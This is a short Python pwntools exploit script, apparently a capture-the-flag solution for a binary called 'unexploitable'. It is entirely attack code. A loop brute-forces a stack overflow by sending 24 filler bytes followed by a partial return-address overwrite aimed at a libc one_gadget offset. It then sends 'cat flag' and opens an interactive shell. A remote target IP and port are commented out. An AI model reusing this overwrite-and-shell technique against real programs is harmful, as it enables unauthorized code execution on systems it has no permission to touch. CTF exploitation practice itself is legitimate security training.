from pwn import * 
import time
# from LibcSearcher import * 
context.log_level = 'debug' 
while 1:
    try:
        p=process('./unexploitable')
        # p=remote('101.201.71.136',25925)
        bug_addr=0x0007D0
        sys_addr=0x000000000004F420
        start_addr=0x0000000000021BA0
        one_gadget=0x10a2fc

        payload=b'a'*0x18+p8(0xd1)#+p16(bug_addr)
        # gdb.attach(p)
        p.send(b'a')
        # pause()
        # p.send(payload)
        payload2=b'a'*0x18+p16(0xa2fc)+p8(0x10)
        # pause()
        time.sleep(0.5)
        p.send(payload2)
        time.sleep(0.1)
        p.sendline(b'cat flag')
        a=p.recv(timeout=0.5)
        p.interactive()
    except EOFError:
        continue
    p.close()
